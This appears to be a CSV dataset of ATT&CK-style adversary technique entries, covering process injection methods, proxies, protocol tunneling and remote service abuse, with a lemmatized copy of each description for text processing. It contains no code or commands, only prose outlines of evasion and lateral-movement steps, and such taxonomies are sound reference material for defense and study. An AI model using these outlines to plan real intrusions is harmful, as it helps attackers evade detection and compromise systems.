process
T1055.004,Process Injection: Asynchronous Procedure Call,"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. APC injection is commonly performed by attaching malicious code to the APC Queue A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL). A variation of APC injection, dubbed ""Early Bird injection"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code process asynchronous procedure apc queue order evade process base defense possibly elevate privilege apc injection method execute arbitrary code address space separate live process apc injection commonly perform attach malicious code apc queue handle exist victim process create native windows api call openthread point queueuserapc invoke function loadlibraya point malicious dll variation apc injection dub early bird injection involve create suspend process malicious code write execute process entry point potentially subsequent anti malware hook apc run code context process allow access process memory system network resource possibly elevated privilege execution apc injection evade detection security product execution mask legitimate process
T1055.005,Process Injection: Thread Local Storage,"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other Process Injection techniques such as Process Hollowing.Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code process thread local storage tls callback order evade process base defense possibly elevate privilege tls callback injection method execute arbitrary code address space separate live process tls callback injection involve manipulate pointer inside portable executable pe redirect process malicious code reach code legitimate entry point tls callback normally os setup cleanup datum thread manipulate tls callback perform allocate write specific offset process memory space process injection technique process hollowing run code context process allow access process memory system network resource possibly elevated privilege execution tls callback injection evade detection security product execution mask legitimate process
T1055.008,Process Injection: Ptrace System Calls,"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code process ptrace process trace system call order evade process base defense possibly elevate privilege ptrace system injection method execute arbitrary code address space separate live process ptrace system injection involve attach modify run process ptrace system enable debug process observe control process individual thread include change memory register value ptrace system injection possible target process non child process high privilege run code context process allow access process memory system network resource possibly elevated privilege execution ptrace system injection evade detection security product execution mask legitimate process
T1055.009,Process Injection: Proc Memory,"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. Proc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/ Other techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep). Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code process filesystem order evade process base defense possibly elevate privilege proc memory injection method execute arbitrary code address space separate live process proc memory injection involve enumerate memory process filesystem technique dynamic linker hijacking populate target process available gadget similar process hollowing proc memory injection target child process background copy sleep run code context process allow access process memory system network resource possibly elevated privilege execution proc memory injection evade detection security product execution mask legitimate process
T1055.011,Process Injection: Extra Window Memory Injection,"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code process extra window memory ewm order evade process base defense possibly elevate privilege ewm injection method execute arbitrary code address space separate live process create window graphical windows base process prescribe register window class stipulate appearance behavior window procedure function handle input output small ewm large store bit pointer point windows procedure malware possibly utilize memory location attack chain include write code share section process memory place pointer code ewm invoke execution return execution control address process grant ewm injection allow access target process memory possibly elevated privilege write payload share section avoid use highly monitor api call writeprocessmemory createremotethread run code context process allow access process memory system network resource possibly elevated privilege execution ewm injection evade detection security product execution mask legitimate process
T1055.012,Process Injection: Process Hollowing,"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process. Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.This is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code suspend hollow process order evade process base defense process hollowing method execute arbitrary code address space separate live process process hollowing commonly perform create process suspend state unmappe hollow memory replace malicious code victim process create native windows api call createprocess include flag suspend process primary thread point process unmappe api call zwunmapviewofsection ntunmapviewofsection write realign inject code resume virtualallocex writeprocessmemory setthreadcontext resumethread respectively similar thread local storage create new process target exist process behavior likely result elevated privilege inject process spawn inherit security context inject process execution process hollowing evade detection security product execution mask legitimate process
T1055.013,Process Injection: Process Doppelgänging,"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. Adversaries may abuse TxF to a perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. Process Doppelgänging is implemented in 4 steps :Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction. Load – Create a shared section of memory and load the malicious executable. Rollback – Undo changes to original executable, effectively removing malicious code from the file system. Animate – Create a process from the tainted section of memory and initiate execution.This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code process process doppelgänging order evade process base defense possibly elevate privilege process doppelgänging method execute arbitrary code address space separate live process windows transactional ntfs txf introduce vista method perform safe file operation deprecate txf application programming interface api enable windows adversary abuse txf perform file variation process injection similar process hollowing process doppelgänging involve replace memory legitimate process enable veiled execution malicious code evade defense detection process doppelgänging use txf avoid use highly monitor api function ntunmapviewofsection virtualprotectex setthreadcontext process doppelgänging implement step transact create txf transaction legitimate executable overwrite file malicious code change isolate visible context transaction load create share section memory load malicious executable rollback undo change original executable effectively remove malicious code file system animate create process taint section memory initiate execution behavior likely result elevated privilege inject process spawn inherit security context inject process execution process doppelgänging evade detection security product execution mask legitimate process
T1055.014,Process Injection: VDSO Hijacking,"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via Ptrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",adversary inject malicious code process vdso hijacking order evade process base defense possibly elevate privilege virtual dynamic shared object vdso hijacking method execute arbitrary code address space separate live process vdso hijacking involve redirect call dynamically link share library memory protection prevent write executable code process ptrace system calls adversary hijack syscall interface code stub map process vdso share object execute syscall open map malicious share object code invoke redirect execution flow process patch memory address reference store process global offset table store absolute address map library code context process allow access process memory system network resource possibly elevated privilege execution vdso hijacking evade detection security product execution mask legitimate process
T1055.015,Process Injection: ListPlanting,"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.List-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a SysListView32 control.ListPlanting (a form of message-passing ""shatter attack"") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the SysListView32 child of the victim process window (via Windows API calls such as FindWindow and/or EnumWindows) or other Process Injection methods.Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function. For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory. Finally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback.",adversary abuse list view control inject malicious code hijack process order evade process base defense possibly elevate privilege listplanting method execute arbitrary code address space separate live process code execute listplanting evade detection security product execution mask legitimate process list view control user interface window display collection item information application list view setting store process memory control listplanting form message passing shatter attack perform copy code virtual address space process use list view control code custom callback sort list item adversary copy code target process memory space perform way include directly obtain handle child victim process window windows api call findwindow enumwindows process injection method variation listplanting allocate memory target process use window message copy payload avoid use highly monitored writeprocessmemory function example adversary use postmessage sendmessage api function send message effectively copy payload byte time allocate memory finally payload trigger send message child process window payload newly allocate buffer pass execute callback
T1572,Protocol Tunneling,"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. Protocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. Adversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure.",adversary tunnel network communication victim system separate protocol avoid detection network filtering enable access unreachable system tunneling involve explicitly encapsulate protocol behavior conceal malicious traffic blend existing traffic provide outer layer encryption similar vpn tunneling enable routing network packet reach intended destination smb rdp traffic filter network appliance route internet mean encapsulate protocol protocol example adversary perform ssh tunneling know ssh port forwarding involve forward arbitrary datum encrypt ssh tunnel protocol tunneling abuse adversary dynamic resolution know dns https doh query resolve infrastructure encapsulate encrypt https packet adversary leverage protocol tunneling conjunction proxy protocol impersonation conceal communication infrastructure
T1090,Proxy,"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",adversary use connection proxy direct network traffic system act intermediary network communication command control server avoid direct connection infrastructure tool exist enable traffic redirection proxy port redirection include htran zxproxy zxportmap adversary use type proxy manage command control communication reduce number simultaneous outbound network connection provide resiliency face connection loss ride exist trusted communication path victim avoid suspicion adversary chain multiple proxy disguise source malicious traffic adversary advantage routing scheme content delivery networks cdns proxy command control traffic
T1090.001,Proxy: Internal Proxy,"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",adversary use internal proxy direct command control traffic system compromised environment tool exist enable traffic redirection proxy port redirection include htran zxproxy zxportmap adversary use internal proxy manage command control communication inside compromised environment reduce number simultaneous outbound network connection provide resiliency face connection loss ride exist trust communication path infected system avoid suspicion internal proxy connection use common peer peer networking protocol smb well blend environment compromised internal system proxy adversary conceal true destination traffic reduce need numerous connection external system
T1090.002,Proxy: External Proxy,"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",adversary use external proxy act intermediary network communication command control server avoid direct connection infrastructure tool exist enable traffic redirection proxy port redirection include htran zxproxy zxportmap adversary use type proxy manage command control communication provide resiliency face connection loss ride exist trust communication path avoid suspicion external connection proxy mask destination traffic typically implement port redirector compromised system outside victim environment purpose purchase infrastructure cloud base resource virtual private server proxy choose base low likelihood connection compromised system investigate victim system communicate directly external proxy internet proxy forward communication server
T1090.003,Proxy: Multi-hop Proxy,"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise. By leveraging Patch System Image, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network. This method is dependent upon the Network Boundary Bridging method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.",disguise source malicious traffic adversary chain multiple proxy typically defender able identify proxy traffic traverse enter network defender able identify previous proxy hop proxy technique make identify original source malicious traffic difficult require defender trace malicious traffic proxy identify source particular variant behavior use onion routing network publicly available tor network case network infrastructure particularly router possible adversary leverage multiple compromise device create multi hop proxy chain wide area network wan enterprise leverage patch system image adversary add custom code affected network device implement onion routing node custom onion routing network transport encrypt traffic compromised population allow adversary communicate device onion routing network method dependent network boundary bridging method order allow adversary cross protect network boundary internet perimeter organization wan protocol icmp transport
T1090.004,Proxy: Domain Fronting,"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",adversary advantage routing scheme content delivery networks cdns service host multiple domain obfuscate intend destination https traffic traffic tunnel https domain fronting involve different domain name sni field tls header host field http header domain serve cdn cdn route address specify http header unwrap tls header variation technique domainless fronting utilize sni field leave blank allow fronting work cdn attempt validate sni http host field match blank sni field example domain x domain y customer cdn possible place domain x tls header domain y http header traffic appear go domain x cdn route domain
T1012,Query Registry,"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.The Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",adversary interact windows registry gather information system configuration instal software registry contain significant information operate system configuration software security information easily query reg utility mean access registry exist information help adversary operation network adversary use information query registry automate discovery shape follow behavior include adversary fully infect target attempt specific action
T1620,Reflective Code Loading,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).Reflective code injection is very similar to Process Injection except that the ""injection"" loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.",adversary reflectively load code process order conceal execution malicious payload reflective loading involve allocate execute payload directly memory process vice create thread process back file path disk reflectively load payload compile binary anonymous file present ram snub fileless executable code ex position independent code injection similar process injection injection load code process memory instead separate process reflective loading evade process base detection execution arbitrary code mask legitimate benign process reflectively load payload directly memory avoid create file artifact disk enable malware payload encrypt obfuscate execution
T1219,Remote Access Software,"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.Remote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. Installation of many remote access tools may also include persistence (ex: the tool's installation routine creates a Windows Service).Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.",adversary use legitimate desktop support remote access software team viewer anydesk logmein ammyyadmin etc establish interactive command control channel target system network service commonly legitimate technical support software allow application control target environment remote access tool like vnc ammyy teamviewer frequently compare legitimate software commonly adversary remote access tool instal post compromise alternate communication channel redundant access way establish interactive remote desktop session target system component malware establish reverse connection connect service adversary control system installation remote access tool include persistence ex tool installation routine create windows tool teamviewer group target institution country interest russian state criminal campaign
T1563,Remote Service Session Hijacking,"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.Adversaries may commandeer these sessions to carry out actions on remote systems. Remote Service Session Hijacking differs from use of Remote Services because it hijacks an existing session rather than creating a new session using Valid Accounts.",adversary control preexisting session remote service laterally environment user use valid credential log service specifically design accept remote connection telnet ssh rdp user log service session establish allow maintain continuous interaction service adversary commandeer session carry action remote system remote service session hijacking differ use remote services hijack exist session create new session valid accounts
T1563.001,Remote Service Session Hijacking: SSH Hijacking,"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.SSH Hijacking differs from use of SSH because it hijacks an existing SSH session rather than creating a new session using Valid Accounts.",adversary hijack legitimate user ssh session laterally environment secure shell ssh standard means remote access linux macos system allow user connect system encrypt tunnel commonly authenticate password certificate use asymmetric encryption key pair order laterally compromise host adversary advantage trust relationship establish system public key authentication active ssh session hijack exist connection system occur compromise ssh agent have access agent socket adversary able obtain root access hijack ssh session likely trivial ssh hijacking differ use ssh hijack exist ssh session create new session valid accounts
T1563.002,Remote Service Session Hijacking: RDP Hijacking,"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, c:\windows\system32\tscon.exe",adversary hijack legitimate user remote desktop session laterally environment remote desktop common feature operate system allow user log interactive session system desktop graphical user interface remote system microsoft refer implementation remote desktop protocol rdp remote desktop services perform rdp session hijacking involve steal legitimate user remote session typically user notify try steal session system permission terminal services console
T1021,Remote Services,"Adversaries may use Valid Accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP). They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. Legitimate applications (such as Software Deployment Tools and other administrative programs) may utilize Remote Services to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer.",adversary use valid accounts log service accept remote connection telnet ssh vnc adversary perform action log user enterprise environment server workstation organize domain domain provide centralized identity management allow user login set credential entire network adversary able obtain set valid domain credential login different machine remote access protocol secure shell ssh remote desktop protocol rdp login accessible saas iaas service federate identity domain legitimate application software deployment tools administrative program utilize remote services access remote host example apple remote desktop ard macos native software remote management ard leverage blend protocol include vnc send screen control buffer ssh secure file transfer
T1021.001,Remote Services: Remote Desktop Protocol,Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.,adversary use valid accounts log computer remote desktop protocol rdp adversary perform action log user remote desktop common feature operate system allow user log interactive session system desktop graphical user interface remote system microsoft refer implementation remote desktop protocol rdp remote desktop services rds adversary connect remote system rdp rds expand access service enable allow access account known credential adversary likely use credential access technique acquire credential use rdp adversary use rdp conjunction accessibility features terminal services dll persistence
T1021.002,Remote Services: SMB/Windows Admin Shares,"Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB,",adversary use valid accounts interact remote network share server message block smb adversary perform action log user smb file printer serial port share protocol windows machine network domain adversary use smb interact file share allow laterally network linux macos implementation smb typically use samba windows system hide network share accessible administrator provide ability remote file copy administrative function example network share include adversary use technique conjunction administrator level valid accounts remotely access networked system smb
T1021.003,Remote Services: Distributed Component Object Model,"Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications",adversary use valid accounts interact remote machine take advantage distributed component object model dcom adversary perform action log user windows component object model com component native windows application programming interface api enable interaction software object executable code implement interface com client object method server object typically dynamic link libraries dll executable exe distributed com dcom transparent middleware extend functionality com local computer remote procedure rpc technology permission interact local remote server com object specify access control list acl registry dcom adversary operate context appropriately privileged user remotely obtain arbitrary direct shellcode execution office application
T1021.004,Remote Services: SSH,"Adversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",adversary use valid accounts log remote machine secure shell ssh adversary perform action log user ssh protocol allow authorized user open remote shell computer linux macos version come ssh instal default typically disable user enable ssh server configure use standard password authentication public private keypair lieu addition password authentication scenario user public key special file computer run server list keypair allow login user
T1021.005,Remote Services: VNC,"Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC). VNC is a platform-independent desktop sharing system that uses the RFB (""remote framebuffer"") protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.VNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.",adversary use valid accounts remotely control machine virtual network computing vnc vnc platform independent desktop sharing system use rfb remote framebuffer protocol enable user remotely control computer display relay screen mouse keyboard input network vnc differ remote desktop protocol vnc screen sharing software resource sharing software default vnc use system authentication configure use credential specific abuse vnc perform malicious action log user open document download file run arbitrary command adversary use vnc remotely control monitor system collect datum information pivot system network specific vnc library implementation susceptible brute force attack memory usage exploitation
T1021.006,Remote Services: Windows Remote Management,"Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).",adversary use valid accounts interact remote system windows remote management winrm adversary perform action log user winrm windows service protocol allow user interact remote system run executable modify registry modify service
T1021.007,Remote Services: Cloud Services,"Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., Cloud API), using commands such as Connect-AZAccount for Azure PowerShell, Connect-MgGraph for Microsoft Graph PowerShell, and gcloud auth login for the Google Cloud CLI.In some cases, adversaries may be able to authenticate to these services via Application Access Token instead of a username and password.",adversary log accessible cloud service compromised environment valid accounts synchronize federate premise user identity adversary perform management action access cloud host resource log user enterprise federate centrally manage user identity cloud service allow user login domain credential order access cloud control plane similarly adversary connect available cloud service web console cloud command line interface cli cloud api command connect azaccount azure powershell connect mggraph microsoft graph powershell gcloud auth login google cloud case adversary able authenticate service application access token instead username password
